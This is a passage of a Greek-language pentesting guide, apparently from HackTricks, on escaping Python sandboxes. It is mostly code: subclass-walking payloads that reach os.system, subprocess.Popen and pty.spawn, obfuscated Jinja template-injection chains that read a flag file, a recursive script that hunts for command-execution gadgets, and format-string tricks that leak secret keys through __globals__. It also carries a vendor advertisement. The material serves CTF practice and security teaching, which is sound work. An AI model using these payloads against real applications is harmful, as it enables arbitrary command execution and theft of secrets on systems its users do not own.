[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
# Without the use of the dir() function
[ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
```
[**Παρακάτω υπάρχει μια μεγαλύτερη συνάρτηση**](./#recursive-search-of-builtins-globals) για να βρείτε δεκάδες/**εκατοντάδες** από **μέρη** όπου μπορείτε να βρείτε τα **globals**.

## Ανακάλυψη Αυθαίρετης Εκτέλεσης

Εδώ θέλω να εξηγήσω πώς να ανακαλύψετε εύκολα **πιο επικίνδυνες λειτουργίες που φορτώνονται** και να προτείνετε πιο αξιόπιστες εκμεταλλεύσεις.

#### Πρόσβαση σε υποκλάσεις με παράκαμψη

Ένα από τα πιο ευαίσθητα μέρη αυτής της τεχνικής είναι η δυνατότητα να **έχετε πρόσβαση στις βασικές υποκλάσεις**. Στα προηγούμενα παραδείγματα αυτό επιτεύχθηκε χρησιμοποιώντας `''.__class__.__base__.__subclasses__()` αλλά υπάρχουν **άλλοι πιθανοί τρόποι**:
```python
#You can access the base from mostly anywhere (in regular conditions)
"".__class__.__base__.__subclasses__()
[].__class__.__base__.__subclasses__()
{}.__class__.__base__.__subclasses__()
().__class__.__base__.__subclasses__()
(1).__class__.__base__.__subclasses__()
bool.__class__.__base__.__subclasses__()
print.__class__.__base__.__subclasses__()
open.__class__.__base__.__subclasses__()
defined_func.__class__.__base__.__subclasses__()

#You can also access it without "__base__" or "__class__"
# You can apply the previous technique also here
"".__class__.__bases__[0].__subclasses__()
"".__class__.__mro__[1].__subclasses__()
"".__getattribute__("__class__").mro()[1].__subclasses__()
"".__getattribute__("__class__").__base__.__subclasses__()

# This can be useful in case it is not possible to make calls (therefore using decorators)
().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["breakpoint"]() # From https://github.com/salvatore-abello/python-ctf-cheatsheet/tree/main/pyjails#no-builtins-no-mro-single-exec

#If attr is present you can access everything as a string
# This is common in Django (and Jinja) environments
(''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()
(''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen'))('cat+flag.txt').read()
```
### Εύρεση επικίνδυνων βιβλιοθηκών που φορτώνονται

Για παράδειγμα, γνωρίζοντας ότι με τη βιβλιοθήκη **`sys`** είναι δυνατή η **εισαγωγή αυθαίρετων βιβλιοθηκών**, μπορείτε να αναζητήσετε όλα τα **φορτωμένα αρθρώματα που έχουν εισάγει το sys μέσα σε αυτά**:
```python
[ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
```
Υπάρχουν πολλές, και **απλά χρειαζόμαστε μία** για να εκτελέσουμε εντολές:
```python
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
```
Μπορούμε να κάνουμε το ίδιο πράγμα με **άλλες βιβλιοθήκες** που γνωρίζουμε ότι μπορούν να χρησιμοποιηθούν για να **εκτελέσουν εντολές**:
```python
#os
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" == x.__init__.__globals__["__name__"] ][0]["system"]("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'os." in str(x) ][0]['system']('ls')

#subprocess
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "subprocess" == x.__init__.__globals__["__name__"] ][0]["Popen"]("ls")
[ x for x in ''.__class__.__base__.__subclasses__() if "'subprocess." in str(x) ][0]['Popen']('ls')
[ x for x in ''.__class__.__base__.__subclasses__() if x.__name__ == 'Popen' ][0]('ls')

#builtins
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "__bultins__" in x.__init__.__globals__ ]
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__("os").system("ls")

#sys
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'_sitebuiltins." in str(x) and not "_Helper" in str(x) ][0]["sys"].modules["os"].system("ls")

#commands (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "commands" in x.__init__.__globals__ ][0]["commands"].getoutput("ls")

#pty (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pty" in x.__init__.__globals__ ][0]["pty"].spawn("ls")

#importlib
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].__import__("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].__import__("os").system("ls")

#pdb
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")
```
Επιπλέον, μπορούμε ακόμη να αναζητήσουμε ποια αρθρώματα φορτώνουν κακόβουλες βιβλιοθήκες:
```python
bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
for b in bad_libraries_names:
vuln_libs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and b in x.__init__.__globals__ ]
print(f"{b}: {', '.join(vuln_libs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pdb:
"""
```
Επιπλέον, αν πιστεύετε ότι **άλλες βιβλιοθήκες** μπορεί να είναι σε θέση να **καλέσουν συναρτήσεις για την εκτέλεση εντολών**, μπορούμε επίσης να **φιλτράρουμε με βάση τα ονόματα των συναρτήσεων** μέσα στις πιθανές βιβλιοθήκες:
```python
bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
for b in bad_libraries_names + bad_func_names:
vuln_funcs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) for k in x.__init__.__globals__ if k == b ]
print(f"{b}: {', '.join(vuln_funcs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pip:
pdb:
system: _wrap_close, _wrap_close
getstatusoutput: CompletedProcess, Popen
getoutput: CompletedProcess, Popen
call: CompletedProcess, Popen
Popen: CompletedProcess, Popen
spawn:
import_module:
__import__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec
load_source: NullImporter, _HackedGetData
execfile:
execute:
__builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, DynamicClassAttribute, _GeneratorWrapper, WarningMessage, catch_warnings, Repr, partialmethod, singledispatchmethod, cached_property, _GeneratorContextManagerBase, _BaseExitStack, Completer, State, SubPattern, Tokenizer, Scanner, Untokenizer, FrameSummary, TracebackException, _IterationGuard, WeakSet, _RLock, Condition, Semaphore, Event, Barrier, Thread, CompletedProcess, Popen, finalize, _TemporaryFileCloser, _TemporaryFileWrapper, SpooledTemporaryFile, TemporaryDirectory, NullImporter, _HackedGetData, DOMBuilder, DOMInputSource, NamedNodeMap, TypeInfo, ReadOnlySequentialNamedNodeMap, ElementInfo, Template, Charset, Header, _ValueFormatter, _localized_month, _localized_day, Calendar, different_locale, AddrlistClass, _PolicyBase, BufferedSubFile, FeedParser, Parser, BytesParser, Message, HTTPConnection, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, Address, Group, HeaderRegistry, ContentManager, CompressedValue, _Feature, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, Queue, _PySimpleQueue, HMAC, Timeout, Retry, HTTPConnection, MimeTypes, RequestField, RequestMethods, DeflateDecoder, GzipDecoder, MultiDecoder, ConnectionPool, CharSetProber, CodingStateMachine, CharDistributionAnalysis, JapaneseContextAnalysis, UniversalDetector, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, DSAParameterNumbers, DSAPublicNumbers, DSAPrivateNumbers, ObjectIdentifier, ECDSA, EllipticCurvePublicNumbers, EllipticCurvePrivateNumbers, RSAPrivateNumbers, RSAPublicNumbers, DERReader, BestAvailableEncryption, CBC, XTS, OFB, CFB, CFB8, CTR, GCM, Cipher, _CipherContext, _AEADCipherContext, AES, Camellia, TripleDES, Blowfish, CAST5, ARC4, IDEA, SEED, ChaCha20, _FragList, _SSHFormatECDSA, Hash, SHAKE128, SHAKE256, BLAKE2b, BLAKE2s, NameAttribute, RelativeDistinguishedName, Name, RFC822Name, DNSName, UniformResourceIdentifier, DirectoryName, RegisteredID, IPAddress, OtherName, Extensions, CRLNumber, AuthorityKeyIdentifier, SubjectKeyIdentifier, AuthorityInformationAccess, SubjectInformationAccess, AccessDescription, BasicConstraints, DeltaCRLIndicator, CRLDistributionPoints, FreshestCRL, DistributionPoint, PolicyConstraints, CertificatePolicies, PolicyInformation, UserNotice, NoticeReference, ExtendedKeyUsage, TLSFeature, InhibitAnyPolicy, KeyUsage, NameConstraints, Extension, GeneralNames, SubjectAlternativeName, IssuerAlternativeName, CertificateIssuer, CRLReason, InvalidityDate, PrecertificateSignedCertificateTimestamps, SignedCertificateTimestamps, OCSPNonce, IssuingDistributionPoint, UnrecognizedExtension, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _OpenSSLError, Binding, _X509NameInvalidator, PKey, _EllipticCurve, X509Name, X509Extension, X509Req, X509, X509Store, X509StoreContext, Revoked, CRL, PKCS12, NetscapeSPKI, _PassphraseHelper, _CallbackExceptionHelper, Context, Connection, _CipherContext, _CMACContext, _X509ExtensionParser, DHPrivateNumbers, DHPublicNumbers, DHParameterNumbers, _DHParameters, _DHPrivateKey, _DHPublicKey, Prehashed, _DSAVerificationContext, _DSASignatureContext, _DSAParameters, _DSAPrivateKey, _DSAPublicKey, _ECDSASignatureContext, _ECDSAVerificationContext, _EllipticCurvePrivateKey, _EllipticCurvePublicKey, _Ed25519PublicKey, _Ed25519PrivateKey, _Ed448PublicKey, _Ed448PrivateKey, _HashContext, _HMACContext, _Certificate, _RevokedCertificate, _CertificateRevocationList, _CertificateSigningRequest, _SignedCertificateTimestamp, OCSPRequestBuilder, _SingleResponse, OCSPResponseBuilder, _OCSPResponse, _OCSPRequest, _Poly1305Context, PSS, OAEP, MGF1, _RSASignatureContext, _RSAVerificationContext, _RSAPrivateKey, _RSAPublicKey, _X25519PublicKey, _X25519PrivateKey, _X448PublicKey, _X448PrivateKey, Scrypt, PKCS7SignatureBuilder, Backend, GetCipherByName, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, RawJSON, JSONDecoder, JSONEncoder, Cookie, CookieJar, MockRequest, MockResponse, Response, BaseAdapter, UnixHTTPConnection, monkeypatch, JSONDecoder, JSONEncoder, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
"""
```
## Αναδρομική Αναζήτηση των Builtins, Globals...

{% hint style="warning" %}
Αυτό είναι απλά **φοβερό**. Αν **ψάχνετε για ένα αντικείμενο όπως τα globals, builtins, open ή οτιδήποτε άλλο**, απλά χρησιμοποιήστε αυτό το σενάριο για να **αναζητήσετε αναδρομικά τα μέρη όπου μπορείτε να βρείτε αυτό το αντικείμενο**.
{% endhint %}
```python
import os, sys # Import these to find more gadgets

SEARCH_FOR = {
# Misc
"__globals__": set(),
"builtins": set(),
"__builtins__": set(),
"open": set(),

# RCE libs
"os": set(),
"subprocess": set(),
"commands": set(),
"pty": set(),
"importlib": set(),
"imp": set(),
"sys": set(),
"pip": set(),
"pdb": set(),

# RCE methods
"system": set(),
"popen": set(),
"getstatusoutput": set(),
"getoutput": set(),
"call": set(),
"Popen": set(),
"popen": set(),
"spawn": set(),
"import_module": set(),
"__import__": set(),
"load_source": set(),
"execfile": set(),
"execute": set()
}

#More than 4 is very time consuming
MAX_CONT = 4

#The ALREADY_CHECKED makes the script run much faster, but some solutions won't be found
#ALREADY_CHECKED = set()

def check_recursive(element, cont, name, orig_n, orig_i, execute):
# If bigger than maximum, stop
if cont > MAX_CONT:
return

# If already checked, stop
#if name and name in ALREADY_CHECKED:
#    return

# Add to already checked
#if name:
#    ALREADY_CHECKED.add(name)

# If found add to the dict
for k in SEARCH_FOR:
if k in dir(element) or (type(element) is dict and k in element):
SEARCH_FOR[k].add(f"{orig_i}: {orig_n}.{name}")

# Continue with the recursivity
for new_element in dir(element):
try:
check_recursive(getattr(element, new_element), cont+1, f"{name}.{new_element}", orig_n, orig_i, execute)

# WARNING: Calling random functions sometimes kills the script
# Comment this part if you notice that behaviour!!
if execute:
try:
if callable(getattr(element, new_element)):
check_recursive(getattr(element, new_element)(), cont+1, f"{name}.{new_element}()", orig_i, execute)
except:
pass

except:
pass

# If in a dict, scan also each key, very important
if type(element) is dict:
for new_element in element:
check_recursive(element[new_element], cont+1, f"{name}[{new_element}]", orig_n, orig_i)


def main():
print("Checking from empty string...")
total = [""]
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Empty str {i}", True)

print()
print("Checking loaded subclasses...")
total = "".__class__.__base__.__subclasses__()
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Subclass {i}", True)

print()
print("Checking from global functions...")
total = [print, check_recursive]
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Global func {i}", False)

print()
print(SEARCH_FOR)


if __name__ == "__main__":
main()
```
Μπορείτε να ελέγξετε την έξοδο αυτού του σεναρίου σε αυτήν τη σελίδα:

{% content-ref url="broken-reference" %}
[Σπασμένος σύνδεσμος](broken-reference)
{% endcontent-ref %}

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Βρείτε ευπάθειες που είναι πιο σημαντικές, ώστε να μπορείτε να τις διορθώσετε πιο γρήγορα. Το Intruder παρακολουθεί την επιθετική επιφάνεια σας, εκτελεί προληπτικές απειλητικές αναζητήσεις, εντοπίζει προβλήματα σε ολόκληρο το τεχνολογικό σας στοίβα, από τα APIs έως τις ιστοσελίδες και τα συστήματα στο cloud. [**Δοκιμάστε το δωρεάν**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) σήμερα.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Μορφοποίηση Συμβολοσειράς σε Python

Εάν **στείλετε** μια **συμβολοσειρά** στην Python που θα **μορφοποιηθεί**, μπορείτε να χρησιμοποιήσετε `{}` για να έχετε πρόσβαση σε **εσωτερικές πληροφορίες της Python**. Μπορείτε να χρησιμοποιήσετε τα προηγούμενα παραδείγματα για να έχετε πρόσβαση σε γενικές μεταβλητές ή ενσωματωμένες γραμμές κώδικα, για παράδειγμα.

{% hint style="info" %}
Ωστόσο, υπάρχει μια **περιορισμένη δυνατότητα**, μπορείτε να χρησιμοποιήσετε μόνο τα σύμβολα `.[]`, οπότε **δεν θα μπορείτε να εκτελέσετε αυθαίρετο κώδικα**, αλλά μόνο να διαβάσετε πληροφορίες.\
_**Εάν γνωρίζετε πώς να εκτελέσετε κώδικα μέσω αυτής της ευπάθειας, παρακαλώ επικοινωνήστε μαζί μου.**_
{% endhint %}
```python
# Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
CONFIG = {
"KEY": "ASXFYFGK78989"
}

class PeopleInfo:
def __init__(self, fname, lname):
self.fname = fname
self.lname = lname

def get_name_for_avatar(avatar_str, people_obj):
return avatar_str.format(people_obj = people_obj)

people = PeopleInfo('GEEKS', 'FORGEEKS')

st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
get_name_for_avatar(st, people_obj = people)
```
Σημειώστε πώς μπορείτε να **αποκτήσετε πρόσβαση σε χαρακτηριστικά** με τον κανονικό τρόπο με ένα **τελεία** όπως `people_obj.__init__` και στοιχεία **λεξικού** με **παρενθέσεις** χωρίς εισαγωγικά `__globals__[CONFIG]`

Επίσης, σημειώστε ότι μπορείτε να χρησιμοποιήσετε `.__dict__` για να απαριθμήσετε στοιχεία ενός αντικειμένου `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`

Ορισμένα άλλα ενδιαφέροντα χαρακτηριστικά από τις συμβολοσειρές μορφοποίησης είναι η δυνατότητα **εκτέλεσης** των **συναρτήσεων** **`str`**, **`repr`** και **`ascii`** στο συγκεκριμένο αντικείμενο προσθέτοντας **`!s`**, **`!r`**, **`!a`** αντίστοιχα:
```python
st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
get_name_for_avatar(st, people_obj = people)
```
